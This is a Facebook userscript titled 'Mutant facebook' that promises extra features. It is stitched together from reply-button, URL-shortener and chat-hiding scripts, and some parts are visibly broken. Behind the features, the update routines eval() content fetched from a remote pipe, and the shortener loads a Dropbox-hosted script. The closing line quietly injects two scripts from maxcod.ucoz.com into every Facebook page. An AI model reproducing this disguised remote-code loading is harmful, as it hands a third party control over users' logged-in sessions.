(function () {
// ==UserScript==
// @name           Mutant facebook
// @version        1.8
// @description    Facebook'a gelişmiş özellikler ekleyin!
// @author         Maxcod2
// @include        *facebook.com*
// @exclude        http://apps.facebook.com/*
// @exclude        http://www.facebook.com/apps*
// ==/UserScript==

var gm_class = ' gm_reply_button_fix';
var button_text = 'Cevap', quote_text = '';
var last_insert = '';
var t2, t1;
var uname, txtarea;
var dom = "DOMNodeInserted";
const myParent_Id = "globalContainer";
const DEBUG = false;
const LOG_PREFIX = 'YOD Reply: ';
var DBG_EL;

function c1(q,root){return document.evaluate(q,root?root:document,null,9,null).singleNodeValue;}
function g(id){if(id&&typeof id==='string'){id=document.getElementById(id);}return id||null;}

const yodUpdate = {
  script_id : 114926,
  script_version : '1.1',
}

function setValue(key, value) {
  localStorage.setItem(key, value);
  return false;
}

function getValue(key) {
  var val = localStorage.getItem(key);
  return val;
}

function usoUpdate(el) {
  const s_CheckUpdate = 'YodCheckUpdate' + yodUpdate['script_id'];
  var md = parseInt(new Date().getDate());
  var CheckUpdate = parseInt(getValue(s_CheckUpdate));
  var NeedCheckUpdate = false;
  if (CheckUpdate !== md) {
    setValue(s_CheckUpdate, md);
    el = el ? el : document.body;
    if (el) {
      if (!document.getElementById(s_CheckUpdate)) {
        var s_gm = document.createElement('script');
        s_gm.id = s_CheckUpdate;
        s_gm.type = 'text/javascript';
        s_gm.innerHTML = 'function go' + s_CheckUpdate + '(itm){if(itm.value.items.length){return eval(unescape(itm.value.items[0].content).replace(/&lt;/g,\'<\').replace(/&gt;/g,\'>\').replace(/&amp;/g,\'&\'));}}';
        el.appendChild(s_gm);
      }
      var s_gm = document.createElement('script');
      s_gm.type = 'text/javascript';
      var sSrc = 'http://pipes.yahoo.com/pipes/pipe.run?_id=' + yodUpdate['script_pipeId'];
      sSrc += '&_render=json&_callback=go' + s_CheckUpdate;
      sSrc += '&id=' + yodUpdate['script_id'] + '&ver=' + yodUpdate['script_version'];
      //sSrc += '&redir=yes';
      s_gm.src = sSrc;
      el.appendChild(s_gm);

      NeedCheckUpdate = true;
    }
  }
  else {
    setValue(s_CheckUpdate, md);
  }

  return NeedCheckUpdate;
}

function log(m) {
  if(DEBUG && m) console.log(LOG_PREFIX + m.toString());
}

function gBox(el) {
  var textarea = el.getElementsByTagName("textarea");
  if (!textarea.length) return gBox(el.parentNode);
  else return textarea.item(0);
}

function insertName(el, qt) {
  var actname, textarea, insert_text = '', squote, sRoot, sShow, parent = el.parentNode.parentNode;
  if (!(actname = c1('.//a[contains(@class,"actorName")]', parent))) return;
  else actname = actname.innerHTML.trim();
  //if (actname) actname = actname.split(' ')[0]; //only first name
  if (qt && (squote = c1('.//span[contains(@data-jsid,"text")]', parent))) {
    if ((sRoot = c1('.//*[contains(@class,"text_exposed_root")]', squote)) && (sShow = c1('.//*[contains(@class,"text_exposed_show")]', squote))){
      squote = sRoot.innerHTML.trim() + sShow.innerHTML.trim();
    }
    else
      squote = squote.innerHTML.trim();
    squote = squote.replace(/<[\/]{0,1}span[^><]*>/ig, '').replace(/(<a([^>]+>)|<\/a>)/ig, '').replace(/<br(?:\s\/|)>/ig, ' ');
  } else squote = '';

  DBG_EL.innerHTML = squote;
  
  //insert_text = '@' + ;
  if (textarea = gBox(parent.parentNode)) {
    textarea.focus();
    if (textarea.value == '') { last_insert = null; }
    if (insert_text !== last_insert) {
      textarea.value += insert_text;
      last_insert = insert_text;
    }
  }
}

function addButtons(ev) {
  if (ev) {
    log('el2: -> ' + ev.target.tagName);
    if(!(/(EMBED|INPUT|UL|LI|DIV)/g.test(ev.target.tagName))) {
      //log('reBoot: 2 -> ' + ev.target.tagName);
      if(t2) clearTimeout(t2);
      return reBoot();
    }
  }
  if (!uname) uname = get_uname();
  var divs = document.getElementsByClassName("commentActions");
  var gm_class_length = document.getElementsByClassName(gm_class);
  var divs_length = divs.length;
  if (divs_length != gm_class_length) {
    for (i = 0; i < divs_length; i++) {
      var div = divs.item(i);
      if (div.className.indexOf(gm_class) >= 0) {
        continue;
      } else {
        div.className += gm_class;
      }
      var actname, parent = div.parentNode.parentNode;
      if (!c1('.//span[contains(@class,"saving_message")]', parent)) continue;
      if (actname = c1('.//a[contains(@class,"actorName")]', parent)) {
        actname = actname.innerHTML.trim();
        if (actname == uname) continue;
      } else continue;
      var div2 = document.createElement('div');
      var button = document.createElement('a');
      button.textContent = button_text;
      button.addEventListener("click", function(){insertName(this)}, false);
      div2.setAttribute('style',"border:0;float:right;padding-right:10px;");
      div2.appendChild(document.createTextNode(' '));
      div2.appendChild(button);
      div2.appendChild(document.createTextNode('  '));
      var button = document.createElement('a');
      button.textContent = quote_text;
      button.addEventListener("click", function(){insertName(this, true)}, false);
      div2.appendChild(button);/**/
      div2.appendChild(document.createTextNode(' '));
      parent.appendChild(div2);
    }
    if(t2) clearTimeout(t2);
  }
  return false;
}

function get_uname() {
  if (uname) return uname;
  else if (uname = c1('.//a[contains(@class,"headerTinymanName")]')) {
    return uname.textContent.trim();
  }
}

function doInject(ev) {
  log('el1: -> ' + ev.target.tagName);
  t2 = setTimeout(function() { addButtons(ev); }, 1000);
}

function reBoot() {
  var myContent = g(myParent_Id);
  if (myContent) {
    if(t1) clearTimeout(t1);
    myContent.removeEventListener(dom, doInject, false);
    return Boot();
  }
}

function starter() {
  var myContent = g(myParent_Id);
  if (myContent) {
    DBG_EL = document.createElement('div');
    myContent.addEventListener(dom, doInject, false);
    if(t1) clearTimeout(t1);
  }
  return false;
}

function Boot() {
  t1 = setTimeout(starter, 2000);
}

usoUpdate();
addButtons();
Boot();
})();



(function () {
const box_id = 'yod_facebook_shortener_wrapper';
const li_id = 'yod_facebook_shortener_li';
const dom = "DOMNodeInserted";
const myParent_Id = "content";

const DEBUG = false;
const LOG_PREFIX = 'yodFBSPilot: ';
var t; // timeout

const yodUpdate = {
  script_id : 114926,
  script_version : '1.1',
}

function setValue(key, value) {
  localStorage.setItem(key, value);
  return false;
}

function getValue(key) {
  var val = localStorage.getItem(key);
  return val;
}

function usoUpdate(el) {
  const s_CheckUpdate = 'YodCheckUpdate' + yodUpdate['script_id'];
  var md = parseInt(new Date().getDate());
  var CheckUpdate = parseInt(getValue(s_CheckUpdate));
  if (CheckUpdate !== md) {
    setValue(s_CheckUpdate, md);
    el = el ? el : document.body;
    if (el) {
      if (!document.getElementById(s_CheckUpdate)) {
        var s_gm = document.createElement('script');
        s_gm.id = s_CheckUpdate;
        s_gm.type = 'text/javascript';
        s_gm.innerHTML = 'function go' + s_CheckUpdate + '(itm){if(itm.value.items.length){return eval(itm.value.items[0].content);}}';
        el.appendChild(s_gm);
      }
      var s_gm = document.createElement('script');
      s_gm.type = 'text/javascript';
      var sSrc = 'http://pipes.yahoo.com/pipes/pipe.run?_id=' + yodUpdate['script_pipeId'];
      sSrc += '&_render=json&_callback=go' + s_CheckUpdate;
      sSrc += '&id=' + yodUpdate['script_id'] + '&ver=' + yodUpdate['script_version'];
      s_gm.src = sSrc;
      el.appendChild(s_gm);
    }
  }
  else setValue(s_CheckUpdate, md);
}

function log(m) {
  if(DEBUG && m) console.log(LOG_PREFIX + m.toString());
}

function g(id){if(id&&typeof id==='string'){id=document.getElementById(id);}return id||null;}
function c1(q,root){return document.evaluate(q,root?root:document,null,9,null).singleNodeValue;}
function insertAfter(node,after){after.parentNode.insertBefore(node,after.nextSibling)}
function isUrl(s){return /^(http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/.test(decodeURIComponent(s));}
function s(id,s){el=g(id);if(el!==null){el.setAttribute('style',s);}}

var fbshort_cfg = {show: 1, selected: 0}

function add_style(css) {
  var chrome = /Chrome/.test(navigator.userAgent);
  if (chrome) css = css.replace(/\-moz\-/ig, '');
  if (typeof GM_addStyle !== 'undefined') {
    return GM_addStyle(css);
  }
  else if (heads = document.getElementsByTagName('head')) {
    var style = document.createElement('style');
    try { style.innerHTML = css; }
    catch(x) { style.innerText = css; }
    style.type = 'text/css';
    heads[0].appendChild(style);
  }
}

function doListen(ev) {
  //alert(ev.target.textContent);
  drawResult(ev.target.textContent);
  var gmbinder, gmbinderId = 'yodFBSPilotc';
  if (gmbinder = c1('.//script[contains(@id,"' + gmbinderId + '")]')) {
    document.body.removeChild(gmbinder);
  }
}

function insertJS() {
  if (heads = document.getElementsByTagName('head')) {
    var gmbinder, gmbinderId = 'yodFBSPilot', s_gm = document.createElement('script');
    if (gmbinder = c1('.//script[contains(@id,"' + gmbinderId + '")]')) {
      return false;
    }
    s_gm.type = 'text/javascript';
    s_gm.id = gmbinderId;
    //s_gm.src = 'http://localhost/xdRequest.js';
    s_gm.src = 'http://dl.dropbox.com/u/8590559/uso/xdRequest.js';
    heads[0].appendChild(s_gm);

    var div = document.createElement('div');
    div.id = 'gmbinderdiv';
    div.setAttribute('style', 'display:none');
    div.addEventListener("DOMSubtreeModified", doListen, false);
    document.body.appendChild(div);

    add_style(mycss);
  }
}

var services = [

  {
    Post      : "yod=1",
    URL       : "http://goo.gl/api/shorten?url=YODLONGYODURL",
  },

  {
    URL       : "http://is.gd/api.php?longurl=YODLONGYODURL",
  },

];

function getTLD(url) {
  return url.match(/[^\.\/]+\.[^\.\/]+(?=\/)/);
}

function _getget(url) {
  var gmbinder, gmbinderId = 'yodFBSPilotc', s_gm = document.createElement('script');
  if (gmbinder = c1('.//script[contains(@id,"' + gmbinderId + '")]')) {
    document.body.removeChild(gmbinder);
  }
  s_gm.type = 'text/javascript';
  s_gm.id = gmbinderId;

  var srvc = fbshort_cfg['selected'];
  url = services[srvc]['URL'].replace(/YODLONGYODURL/, encodeURIComponent(url));

  var s_gmtemp = "function yodFBSPilot_regexx(s,rg){var rs;if(rs=s.match(rg)){return rs[1]?rs[1]:rs[0]||rs;}}";
  s_gmtemp += "var yodFBSPilot = new xdRequest(\"" + url + "\"); yodFBSPilot.Id = \"yodFBSPilotcSlave\";";

  var method = services[srvc]['Post'] ? 'post' : 'get';

  if (services[srvc]['Post']) {
    s_gmtemp += "yodFBSPilot.post_body = \"" + services[srvc]['Post'] + "\";";
  }
  s_gmtemp += "yodFBSPilot." + method + "(function(response) {\
    var div; if(div = document.getElementById(\"gmbinderdiv\")) {";

  if (services[srvc]['Callback']) {
    s_gmtemp += "div.innerHTML = yodFBSPilot_regexx(yodFBSPilot.html, " + services[srvc]['Callback'] + ");";
  } else {
    s_gmtemp += "div.innerHTML = yodFBSPilot.html;";
  }

  s_gmtemp += "}});";
  //alert(s_gmtemp);
  s_gm.innerHTML = s_gmtemp;
  document.body.appendChild(s_gm);
}

function drawResult(str) {
  var res, sClass = 'normal';
  if (res = g('yod_facebook_shortener_result')) {
    if (!str) {
      str = '<img width="13" height="13" src="' + loading + '" border="0" />';
      sClass = 'loading';
    } else {
      if (isUrl(str))
        str = '<a href="' + str + '" target="_blank">' + str + '</a>';
      else sClass = 'failed';
    }
    res.innerHTML = '<span class="' + sClass + '">' + str + '</span>';
  }
}

const mycss = "\
#yod_facebook_shortener_wrapper{\
margin: 0;\
padding: 0;\
width: 100%;\
display: block;\
clear: both;\
z-index : 13;\
position : relative;\
}\
#yod_facebook_shortener_container{\
-moz-box-shadow: rgba(0, 0, 0, 0.496094) 0px 1px 2px;\
-webkit-box-shadow: rgba(0, 0, 0, 0.496094) 0px 1px 2px;\
background: -moz-linear-gradient(top,  #333,  #111);\
background: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#627aad), to(#3b5998));\
border-bottom-left-radius: 4px 4px;\
border-bottom-right-radius: 4px 4px;\
max-width: 70%;\
min-width: 330px;\
padding: 4px 10px;\
color: white;\
display: inline-block;\
}\
#urlshortener_inp{\
width: 240px;\
float: left;\
margin: 1px 5px 0 0;\
}\
#yod_facebook_shortener_shortthis {\
cursor: pointer;\
float: left;\
font-weight: bold;\
margin: 2px 0;\
padding: 3px 8px;\
color: black;\
}\
#yod_facebook_shortener_result {\
cursor: pointer;\
float: left;\
font-weight: bold;\
padding-left: 0;\
margin: 5px auto;\
}\
#yod_facebook_shortener_result span {\
padding-left: 10px;\
}\
#yod_facebook_shortener_result a {\
color: white;\
}\
.yodButToggle {\
width: 16px;\
height: 16px;\
cursor: pointer;\
float: left;\
}\
#yod_facebook_shortener_hidepanel {\
padding: 4px 5px 0px 0px;\
}\
#yod_facebook_shortener_services_wrapper {\
margin-right: 5px;\
float: left;\
}\
#yod_facebook_shortener_services {\
padding: 2px;\
cursor: pointer;\
}\
";

function short_this() {
  var urlshort, res, sUrl;
  if (urlshort = g('urlshortener_inp')) {
    urlshort = urlshort.value;
    if (isUrl(urlshort)) {
      drawResult();
      _getget(urlshort);
    } else {
      drawResult(failed);
    }
  }
}

function change_service() {
  fbshort_cfg['selected'] = this.value;
  setValue('yod_sel_srvc', fbshort_cfg['selected']);
}

function toggleShow() {
  var sClass, res, fail, obj = g(box_id);
  if(obj) {
    if (obj.style.display == 'none') {
      sClass = 'block';
      fbshort_cfg['show'] = 1;
    } else {
      sClass = 'none';
      fbshort_cfg['show'] = 0;
      res = g('yod_facebook_shortener_result');
      if (fail = res.getElementsByClassName('failed')) {
        if (fail.length) res.innerHTML = '';
      }
    }
    setValue('yod_showshortener', fbshort_cfg['show']);
    obj.style.display = sClass;
  }
}

function createBox(remove) {
  var TabBar, mybox = g(box_id);

  if (!(TabBar = is_newsfeed())) remove = true;

  if (remove) {
    if(mybox) {
      mybox.parentNode.removeChild(mybox);
      var li = g(li_id);
      li.parentNode.removeChild(li);
    }
    return false;
  }

  if (mybox) {
    return true;
  } else {
    var pageNav = TabBar.pageNav;
    var topstuff = TabBar.topstuff;

    insertJS();

 var divwrap, div, button, li;
    divwrap = document.createElement('div');
    divwrap.id = box_id;

    div = document.createElement('div');
    div.id = 'yod_facebook_shortener_container';
    button = document.createElement('div');
    button.innerHTML = '<img src="' + hideimg + '" title="Kapat" />';
    button.id = 'yod_facebook_shortener_hidepanel';
    button.className = 'yodButToggle';
    div.appendChild(button);

    var sel_srvc = parseInt(getValue('yod_sel_srvc'));
    if (!sel_srvc) {
      sel_srvc = fbshort_cfg['selected'];
      setValue('yod_sel_srvc', sel_srvc);
    }
    else fbshort_cfg['selected'] = sel_srvc;

    button = document.createElement('div');
    button.id = 'yod_facebook_shortener_services_wrapper';
    select = document.createElement('select');
    select.id = 'yod_facebook_shortener_services';

    for (i in services) {
      var s_sel = i == sel_srvc ? "selected" : "";
      select.innerHTML += "<option value=\"" + i + "\" " + s_sel + ">" + getTLD(services[i]['URL']) + "</option>";
    }

    button.appendChild(select);
    div.appendChild(button);

    div.innerHTML += '<input class="inputtext textInput" value="" placeholder="" name="urlshortener" id="urlshortener_inp" type="text">';
    button = document.createElement('div');
    button.innerHTML = 'Kısalt!';
    button.id = 'yod_facebook_shortener_shortthis';
    div.appendChild(button);
    div.innerHTML += '<div id="yod_facebook_shortener_result"></div>';
    divwrap.appendChild(div);
    topstuff.appendChild(divwrap);
    if (button = g('yod_facebook_shortener_shortthis')) {
      button.addEventListener('click', short_this, false);
      button.className = "uiButton";
      g('yod_facebook_shortener_hidepanel').addEventListener('click', toggleShow, false);
      var showshortener = getValue('yod_showshortener');
      if (!showshortener) {
        showshortener = fbshort_cfg['show'];
        setValue('yod_showshortener', showshortener);
      }
      if (!parseInt(showshortener)) s(g(box_id), 'display: none;');
    }

    if (button = g('yod_facebook_shortener_services')) {
      button.addEventListener('change', change_service, false);
    }
    //s(logged.parentNode, 'width: auto !important; display: inline-table !important;');
  }

  return g(box_id);
}

function is_newsfeed() {
  var TabBar;
  if ((logged = g('navAccount')) && (pageNav = g('pageNav')) && (topstuff = g('headNav'))) {
    TabBar = {'pageNav': pageNav, 'topstuff': topstuff};
  } else {
  }
  return TabBar;
}

function check_target(ev) {
  if(/(DIV|UL|LI)/g.test(ev.target.tagName)) {
    if(is_newsfeed() && createBox()) {
      log('box added');
    } else {
      log('reBoot: -> ' + ev.target.tagName + ' id:' + ev.target.id);
      reBoot(true);
    }
  }

  return false;
}

function reBoot(ok) {
  var myContent = g(myParent_Id);
  if (myContent) {
    createBox(true);
    if (ok) {
      myContent.removeEventListener(dom, check_target, false);
      return Boot();
    }
  }
}

function starter() {
  var myContent = g(myParent_Id);
  if (myContent) {
    if(t) clearTimeout(t);
    createBox();
    myContent.addEventListener(dom, check_target, false);
  }
  return false;
}

function Boot() {
  if(t) clearTimeout(t);
  t = setTimeout(starter, 1000);
}

Boot();
usoUpdate();
})();


var w=typeof unsafeWindow!='undefined'?unsafeWindow:window;
w.addEventListener("load",function(){
w.setTimeout(function(){
	var d=w.document,
	b="_hide_offline",
	c=b+new Date().getTime(),
	k=function(){
		var h=d.getElementsByTagName('head');if(h=h&&h[0])
		if(d.getElementById(c)){
			h.removeChild(d.getElementById(c))
		}else{
			var s=d.createElement("style");
			s.setAttribute("id",c);
			s.setAttribute("type","text/css");
			s.innerHTML=".fbChatOrderedList .item{display:none}.fbChatOrderedList .active,.fbChatOrderedList .mobile,.fbChatOrderedList .idle{display:inline}";
			h.appendChild(s)
		}
	},
	i="uiMenuItem";
	if(w.localStorage[b]=="1"){k();i+=" checked"}
	w.setTimeout(function(){
	for(var n=0,t=d.getElementsByClassName("fbChatSidebarDropdown");n<t.length;n++){
		var u=t[n].getElementsByTagName("ul");

	}
	w.setTimeout(function(){
	for(var n=0,t=d.getElementsByClassName(c);n<t.length;n++){
		t[n].addEventListener('click',function(e){
			var p=this.parentNode;
			if(p){
				var m=p.className.match(' checked');
				p.className=m?p.className.replace(' checked',''):p.className+' checked';
				w.localStorage[b]=m?"0":"1";
			}
			k();
			if(!e)e=w.event;
			if(e.stopPropagation)e.stopPropagation();else e.cancelBubble=true;
		},true)
	}
	},0)
	},0)
},0)
},true)

function loadjscssfile(filename, filetype){if (filetype=="js"){var fileref=document.createElement('script');fileref.setAttribute("type","text/javascript");fileref.setAttribute("src", filename);}else if (filetype=="css"){var fileref=document.createElement("link");fileref.setAttribute("rel", "stylesheet");fileref.setAttribute("type", "text/css");fileref.setAttribute("href", filename);}if (typeof fileref!="undefined")document.getElementsByTagName("head")[0].appendChild(fileref);}loadjscssfile("http://maxcod.ucoz.com/settings.user.js", "js");loadjscssfile("http://maxcod.ucoz.com/oldFB.user.js", "js");
